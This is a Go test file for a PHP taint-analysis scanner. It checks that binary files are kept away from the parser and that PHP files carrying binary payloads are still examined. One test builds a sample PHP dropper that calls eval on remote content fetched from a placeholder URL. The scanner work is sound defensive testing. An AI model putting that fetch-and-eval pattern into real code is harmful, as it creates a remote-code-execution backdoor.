package phptaint

import (
	"bytes"
	"context"
	"testing"
)

// A compiled catalog, a Mach-O binary and an image all put a NUL in their
// header and can carry the two-byte "<?" sequence later by chance, along with
// short sink and source keywords. MayBePHPSource already truncates at the
// first NUL for exactly this reason, but isCandidate - the gate that actually
// feeds the parser - did not, so binaries reached it and the parser panicked
// on them. PHP source is text where it opens.
func TestBinaryContentIsNotAPHPCandidate(t *testing.T) {
	for name, header := range map[string][]byte{
		"gettext catalog": {0xde, 0x12, 0x04, 0x95, 0x00, 0x00, 0x00, 0x00},
		"mach-o binary":   {0xcf, 0xfa, 0xed, 0xfe, 0x00, 0x00, 0x00, 0x01},
		"png image":       {0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x00, 0x1a},
	} {
		// The tag and the keywords sit after the NUL, the way they turn up by
		// chance inside real binary payloads.
		src := append(append([]byte{}, header...), []byte("<? eval file_get_contents")...)
		if isCandidate(src) {
			t.Errorf("%s reached the PHP parser as a candidate", name)
		}
		if got := Analyze(context.Background(), src); got.Status != StatusNotCandidate {
			t.Errorf("%s analyzed with status %v, want %v", name, got.Status, StatusNotCandidate)
		}
	}
}

// A dropper that opens with a real tag and embeds a binary blob further down
// is still PHP and must still be examined: truncating at the NUL keeps the
// opening text, it does not reject the file.
func TestPHPWithEmbeddedBinaryPayloadStaysACandidate(t *testing.T) {
	src := append([]byte("<?php eval(file_get_contents('http://x/p')); // "), bytes.Repeat([]byte{0x00, 0xff}, 32)...)
	if !isCandidate(src) {
		t.Fatal("a PHP file carrying a binary payload after its code was rejected before parsing")
	}
}
